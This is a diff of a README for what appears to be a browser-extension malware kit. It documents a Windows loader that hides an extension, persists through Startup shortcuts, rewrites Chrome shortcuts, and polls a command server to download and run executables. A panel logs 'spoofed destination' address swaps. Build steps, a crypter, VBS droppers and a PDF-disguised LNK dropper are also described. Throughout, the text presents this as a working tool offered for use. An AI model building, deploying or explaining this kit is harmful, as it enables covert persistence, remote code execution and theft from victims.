@@ -40,16 +40,16 @@ Displays statistics of connected devices:
 1. Specify 10 preset swap values in configmeta.json.
 2. Successful swaps are logged in a table showing:
 
-   * Device **Status**
-   * **Override Address** (spoofed destination)
-   * **Timestamp**
+   * Device Status
+   * Override Address spoofed destination
+   * Timestamp
 
 ### Extension Panel
 
-* Real-time **randomizer** output(shown to the user whether or not it was swapped
-* Enter preset values **by groups**
-* View **history** of randomizer swaps
-* See the **last generated number**
+* Real-time randomizer output shown to the user whether or not it was swapped
+* Enter preset values by groups
+* View history of randomizer swaps
+* See the last generated number
 
 ### Settings
 
@@ -68,62 +68,62 @@ Change the panels login/password stored in configpass.json.
 
 ### Auth Credentials
 
-```text
+```
 login : admin
 password: admin
 ```
 
-### MongoDB (data storage)
+### MongoDB data storage
 
 | Section           | Features                                                                                                               |
 | ----------------- | ---------------------------------------------------------------------------------------------------------------------- |
-| **Home**          | Filter *Online / Offline*, search by **Device ID**<br>Send commands to a specific device<br>View device list & history |
-| **Configuration** | Edit **Url Lock** / **Url Unlock** for Xlock page                                                                      |
+| **Home**          | Filter *Online / Offline*, search by Device ID <br>Send commands to a specific device<br>View device list & history |
+| **Configuration** | Edit Url Lock / Url Unlock for Xlock page                                                                      |
 
 ---
 
-## 🪟 Build Windows – `loadWin` (x64)
+## 🪟 Build Windows – loadWin x64
 
-* Uses `winshell`, `shutil`
-* Creates **autorun** shortcut in *Startup*
-* Restarts Chrome via `.bat`
+* Uses winshell, shutil
+* Creates autorun shortcut in *Startup*
+* Restarts Chrome via .bat
 * Recursively finds every Chrome shortcut and overwrites it
-* Works with temp files in `%TEMP%`
+* Works with temp files in %TEMP%
 
 > *Built-in obfuscator is planned but not finalized.*
 
 ### Build Steps
 
-```bash
-# 1 – Install PyInstaller
+```
+1 – Install PyInstaller
 pip install pyinstaller
 
-# 2 – Build executable
+2 – Build executable
 pyinstaller --onefile --add-data "extension;extension" loadwin.py
 ```
 
-* `--add-data "extension;extension"` embeds the **extension** directory.
-* Output: `dist/loadwin.exe`
-* **Install all dependencies first!**
+* `--add-data "extension;extension"` embeds the extension directory.
+* Output: dist/loadwin.exe
+* Install all dependencies first
 
 ### File Variants
 
 | Script         | Purpose                                                                |
 | -------------- | ---------------------------------------------------------------------- |
 | `loadwin.py`   | Full version: installs in system, loads extension, awaits all commands |
-| `loader.py`    | Installs extension **only** and handles `restart_chrome`               |
-| `load.py`      | Same as `loadwin.py` *except* no persistence on disk                   |
-| *Sample build* | See `scrypt/exe/`                                                      |
+| `loader.py`    | Installs extension only and handles `restart_chrome`               |
+| `load.py`      | Same as loadwin.py except no persistence on disk                   |
+| *Sample build* | See scrypt/exe/                                                      |
 
 > **Requires admin rights** for stability – runs, but unreliably, without them.
 
 ### Runtime Functionality
 
-1. **First run:** copies extension to `%APPDATA%\.hidden_extension\extension` if absent.
-2. Adds shortcut to *Startup* (`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`).
-3. Locates every `Chrome.lnk` and adds `--load-extension="…"` to the target.
-4. Kills *all* Chrome processes, waits 3 min, re-launches Chrome via temp `.bat`.
-5. Polls the server every **30 s** for commands:
+1. **First run:** copies extension to %APPDATA%\.hidden_extension\extension if absent.
+2. Adds shortcut to Startup %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup.
+3. Locates every Chrome.lnk and adds --load-extension="…" to the target.
+4. Kills all Chrome processes, waits 3 min, re-launches Chrome via temp .bat.
+5. Polls the server every 30 s for commands:
 
    * `restart_chrome` — update shortcuts & restart
    * `load_and_run` — download `.exe` to temp & run
@@ -154,7 +154,7 @@ Panel URL
 http://localhost/
 ```
 
-Uses **MongoDB** – recommended GUI: *MongoDB Compass*.
+Uses MongoDB – recommended GUI: MongoDB Compass.
 
 ---
 
@@ -162,11 +162,11 @@ Uses **MongoDB** – recommended GUI: *MongoDB Compass*.
 
 | Folder      | Description                                                                |
 | ----------- | -------------------------------------------------------------------------- |
-| `Cvbs`      | VBS mods that download & run `install.vbs` on various Windows versions     |
+| `Cvbs`      | VBS mods that download & run install.vbs on various Windows versions     |
 | `DropDemo`  | Demo crypter for `load.exe`                                                |
-| `exe`       | Pre-built `load.exe` (Python + extension packed)                           |
-| `lnk`       | Auto-creates a shortcut that opens a PDF *and* runs `install.vbs` silently |
-| `loadermac` | macOS installer (demo, WIP, requires admin password)                       |
+| `exe`       | Pre-built load.exe Python + extension packed                           |
+| `lnk`       | Auto-creates a shortcut that opens a PDF *and* runs install.vbs silently |
+| `loadermac` | macOS installer demo, WIP, requires admin password                       |
 
 ---
 
